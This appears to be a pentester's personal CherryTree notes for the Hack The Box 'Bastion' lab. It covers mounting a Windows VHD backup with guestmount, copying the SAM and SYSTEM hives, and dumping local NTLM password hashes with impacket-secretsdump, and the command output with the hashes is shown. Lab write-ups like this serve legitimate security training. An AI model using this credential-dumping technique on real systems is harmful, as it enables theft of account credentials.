<!doctype html><html>
    <head>
      <meta http-equiv="content-type" content="text/html; charset=utf-8">
      <title>vhd</title>
      <meta name="generator" content="CherryTree">
      <link rel="stylesheet" href="res/styles3.css" type="text/css" />
    </head>
    <body><div class='page'><h1 class='title'>vhd</h1><br/>A vhd is a virtual hard disk. They are often found in pairs, one being the boot partion, the other being where the data lies.<br /><br />7z l sdfasdfasdf.vhd        to list the files<br />7z x asdfasdfsdf.vhd        to extract the files (these can be huge, so not optimal)<br /><br /><br /><br />once you have the .vhd on the box (optimally haveing the drive that contains the vhd mounted. Then run guestmount to mount the .vhd as another drive<br />guestmount --add /mnt/Bastion/WindowsImageBackup/L4mpje-PC/Backup\ 2019-02-22\ 124351/9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd --inspector --ro -v /mnt/vhd<br />cd /mnt/vhd<br /><br />user<br /><br />c:\windows\system32\config<br />    sam (user database)<br />    system  registy hives (hklm) (system boot key)<br />    ntvs.dit if it is a dc<br />    <br />cp these dirs to /Yeet/Machines/HTB/Bastion/dbdump<br />run impacket-secretsdump on the file and BOOOM Hashes!!     <br />    <br />    <br />    <br />    <br />    <br />root@CoolHandKali:/Yeet/Machines/HTB/Bastion/dbdump# ls<br />SAM  SYSTEM<br />root@CoolHandKali:/Yeet/Machines/HTB/Bastion/dbdump# impacket-secretsdump -sam SAM -system SYSTEM local<br />Impacket v0.9.20 - Copyright 2019 SecureAuth Corporation<br /><br />[*] Target system bootKey: 0x8b56b2cb5033d8e2e289c26f8939a25f<br />[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)<br />Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::<br />Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::<br />L4mpje:1000:aad3b435b51404eeaad3b435b51404ee:26112010952d963c8dc4217daec986d9:::<br />[*] Cleaning up... <br />root@CoolHandKali:/Yeet/Machines/HTB/Bastion/dbdump# <br /></div></body></html>